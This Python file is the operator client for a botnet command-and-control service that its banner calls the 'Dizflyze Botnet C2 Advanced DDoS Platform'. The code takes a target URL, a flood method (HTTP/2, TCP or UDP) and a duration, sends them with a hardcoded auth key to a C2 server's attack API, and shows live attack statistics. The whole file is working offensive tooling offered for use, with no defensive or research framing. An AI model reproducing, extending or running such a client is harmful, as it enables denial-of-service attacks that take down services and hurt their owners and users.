import os
import time
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn
from rich.layout import Layout
from rich.live import Live
from rich.style import Style
from urllib.parse import urlparse

console = Console()

class C2Client:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'X-Auth-Key': 'D!zFlyz3_S3cr3tK3y',
            'Content-Type': 'application/json'
        })
        self.base_url = ""
        self.active_attack = None

    def show_banner(self):
        banner = Panel("""
[bold magenta]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀ ⠀ ⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  [ # ] Dizflyze v4.0
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿  [ # ] C2 Matrix
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀ ⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] Client Mode
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋   ⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] Premium Edition
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀ ⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
[/]
""", title="[blink bold cyan]DIZFLYZE BOTNET C2[/]", subtitle="[bold yellow]ADVANCED DDOS PLATFORM", style="bold white")
        console.print(banner)

    def validate_target(self, target):
        try:
            result = urlparse(target)
            return all([result.scheme, result.netloc])
        except:
            return False

    def attack_menu(self):
        methods = {
            "1": ("HTTP/2 Flood", "http2"),
            "2": ("TCP Wave", "tcp"),
            "3": ("UDP Storm", "udp")
        }
        
        table = Table(title="[bold yellow]Attack Vectors", show_header=False)
        table.add_column("Option", style="cyan")
        table.add_column("Description", style="magenta")
        
        for k, v in methods.items():
            table.add_row(f"[{k}]", v[0])
        
        console.print(Panel(table, title="[bold green]Select Attack Method"))

        choice = console.input("[bold white]➤ Select vector (1-3): ")
        return methods.get(choice, (None, None))[1]

    def start_attack(self, url):
        method = self.attack_menu()
        if not method:
            console.print("[red]Invalid selection!")
            return

        duration = console.input("[bold white]➤ Duration (seconds): ")
        if not duration.isdigit():
            console.print("[red]Invalid duration!")
            return
        duration = int(duration)

        payload = {
            "target": url,
            "method": method,
            "duration": duration
        }

        try:
            response = self.session.post(
                f"{self.base_url}/api/attack",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                self.active_attack = response.json()
                self.monitor_attack()
            else:
                console.print(f"[red]Error: {response.text}")
        except Exception as e:
            console.print(f"[red]Connection error: {str(e)}")

    def monitor_attack(self):
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="main", ratio=1),
            Layout(name="footer", size=7)
        )

        progress = Progress(
            SpinnerColumn("bouncingBall", style="yellow"),
            *Progress.get_default_columns(),
            expand=True
        )

        stats_table = Table.grid(padding=1)
        stats_table.add_column("Metric", style="cyan")
        stats_table.add_column("Value", style="white")

        layout["header"].update(
            Panel(f"[bold green]Attacking {self.active_attack['endpoint']}", style="white")
        )
        layout["main"].update(
            Panel(progress, title="[bold yellow]Attack Progress")
        )
        layout["footer"].update(
            Panel(stats_table, title="[bold magenta]Real-time Statistics")
        )

        attack_id = self.active_attack['attackId']
        start_time = time.time()
        
        with Live(layout, refresh_per_second=4, screen=True):
            task = progress.add_task("", total=self.active_attack['duration'])
            
            while True:
                try:
                    response = self.session.get(
                        f"{self.base_url}/api/attack/{attack_id}",
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        elapsed = time.time() - start_time
                        
                        # Update progress
                        progress.update(task, completed=data['percentage'])
                        
                        # Update stats
                        stats_table.rows = [
                            ("Method", f"[green]{self.active_attack['method'].upper()}"),
                            ("Duration", f"{self.active_attack['duration']}s"),
                            ("Elapsed", f"{elapsed:.1f}s"),
                            ("Requests", f"[cyan]{data['requests']:,}"),
                            ("Errors", f"[red]{data['errors']:,}"),
                            ("Bandwidth", f"{data['bandwidth']/1024/1024:.2f} MB")
                        ]
                        
                        if data['percentage'] >= 100:
                            break
                    
                    time.sleep(0.5)
                except:
                    break

        console.print(Panel(
            "[bold green]✓ Attack completed successfully!",
            subtitle=f"[white]Final report: {self.active_attack['endpoint']}",
            style="bold white"
        ))

    def main_loop(self):
        self.show_banner()
        self.base_url = console.input("[bold white]➤ Enter C2 URL: ")
        
        while True:
            console.print("\n[bold cyan]Main Menu:")
            console.print(" [1] Start New Attack")
            console.print(" [2] View Attack History")
            console.print(" [3] Exit")
            
            choice = console.input("\n[bold white]➤ Select option: ")
            
            if choice == "1":
                target = console.input("[bold white]➤ Target URL: ")
                if not self.validate_target(target):
                    console.print("[red]Invalid target URL!")
                    continue
                self.start_attack(target)
            elif choice == "2":
                console.print("[yellow]Feature coming soon!")
            elif choice == "3":
                console.print("[bold magenta]Goodbye!")
                break
            else:
                console.print("[red]Invalid option!")

if __name__ == "__main__":
    client = C2Client()
    try:
        client.main_loop()
    except KeyboardInterrupt:
        console.print("\n[bold red]Session terminated!")
